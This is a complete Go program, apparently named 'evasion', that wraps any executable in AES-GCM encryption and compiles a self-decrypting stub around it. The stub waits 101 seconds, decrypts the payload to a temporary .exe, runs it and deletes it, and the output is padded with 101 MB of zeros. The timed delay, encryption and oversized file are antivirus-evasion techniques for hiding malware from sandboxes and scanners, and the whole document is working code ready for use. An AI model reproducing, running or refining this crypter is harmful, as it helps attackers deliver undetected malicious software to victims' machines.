package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
)

// AES-256
func generateKey() []byte {
	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		log.Fatal("Failed to generate encryption key:", err)
	}
	return key
}

// aesEncrypt AES-GCM
func aesEncrypt(data, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("failed to create cipher: %w", err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("failed to create GCM: %w", err)
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil, fmt.Errorf("failed to generate nonce: %w", err)
	}

	return gcm.Seal(nonce, nonce, data, nil), nil
}

func createSelfDecryptingExecutable(encryptedData, key []byte, outputFileName string) error {
	template := fmt.Sprintf(`
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"os"
	"os/exec"
	"time"
)

// Encryption key and encrypted data
var encryptionKey = %#v
var encryptedData = %#v

func main() {
	// Wait for 101 seconds
	fmt.Println("Waiting 101 seconds...")
	time.Sleep(101 * time.Second)

	// Decrypt the embedded data
	decryptedData, err := aesDecrypt(encryptedData, encryptionKey)
	if err != nil {
		fmt.Println("Failed to decrypt executable:", err)
		return
	}

	// Save to a temporary file
	tempFile, err := os.CreateTemp("", "*.exe")
	if err != nil {
		fmt.Println("Failed to create temporary file:", err)
		return
	}
	defer os.Remove(tempFile.Name())

	_, err = tempFile.Write(decryptedData)
	if err != nil {
		fmt.Println("Failed to write decrypted data:", err)
		return
	}
	tempFile.Close()

	// Execute the decrypted executable
	cmd := exec.Command(tempFile.Name())
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err = cmd.Run()
	if err != nil {
		fmt.Println("Failed to execute file:", err)
	}
}

// aesDecrypt decrypts data using AES-GCM with the provided key
func aesDecrypt(encryptedData, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("failed to create cipher: %%w", err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("failed to create GCM: %%w", err)
	}

	nonceSize := gcm.NonceSize()
	if len(encryptedData) < nonceSize {
		return nil, fmt.Errorf("invalid encrypted data")
	}

	nonce, ciphertext := encryptedData[:nonceSize], encryptedData[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}
`, key, encryptedData)

	// Write the Go code to a temporary file
	tempGoFile := "temp_decryptor.go"
	if err := os.WriteFile(tempGoFile, []byte(template), 0644); err != nil {
		return fmt.Errorf("failed to write Go file: %w", err)
	}
	defer os.Remove(tempGoFile)

	// Compile the Go file into a Windows executable
	cmd := exec.Command("go", "build", "-o", outputFileName, tempGoFile)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("failed to compile executable: %w", err)
	}

	f, err := os.OpenFile(outputFileName, os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		return fmt.Errorf("failed to open output file for padding: %w", err)
	}
	defer f.Close()

	padding := make([]byte, 101*1024*1024)
	if _, err := f.Write(padding); err != nil {
		return fmt.Errorf("failed to write padding: %w", err)
	}

	return nil
}

func main() {

	if len(os.Args) != 2 {
		fmt.Println("Usage: evasion <path_to_executable>")
		return
	}

	inputFile := os.Args[1]
	data, err := os.ReadFile(inputFile)
	if err != nil {
		log.Fatalf("Failed to read input file: %v", err)
	}

	encryptionKey := generateKey()
	encryptedData, err := aesEncrypt(data, encryptionKey)
	if err != nil {
		log.Fatalf("Failed to encrypt data: %v", err)
	}

	outputFile := "encrypted_" + filepath.Base(inputFile)
	err = createSelfDecryptingExecutable(encryptedData, encryptionKey, outputFile)
	if err != nil {
		log.Fatalf("Failed to create self-decrypting executable: %v", err)
	}

	fmt.Printf("Encrypted executable created: %s\n", outputFile)
}
